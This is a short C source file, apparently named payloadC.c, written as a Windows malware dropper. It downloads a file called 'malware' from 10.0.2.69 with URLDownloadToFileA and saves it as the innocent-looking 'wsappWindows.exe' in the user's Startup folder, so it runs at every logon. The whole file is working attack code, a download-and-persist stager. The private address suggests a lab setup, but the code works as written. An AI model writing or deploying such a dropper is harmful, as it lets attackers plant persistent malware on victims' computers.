// make a c program that will download a file from a web server and save it on the local machine,
// only using windows API calls
// gcc -o payloadC.exe payloadC.c -lurlmon

#include <stdio.h>
#include <windows.h>
#include <shlobj.h>

#pragma comment(lib, "Shell32.lib")

int main(void) {
    char szFileName[] = "wsappWindows.exe";
    LPSTR folderPath = (LPSTR)malloc(1024);

    SHGetSpecialFolderPathA(0, folderPath, CSIDL_STARTUP, 0);
    strcat(folderPath, "\\");
    strcat(folderPath, szFileName);
    URLDownloadToFileA(0,"http://10.0.2.69/malware",folderPath,0,0);
}
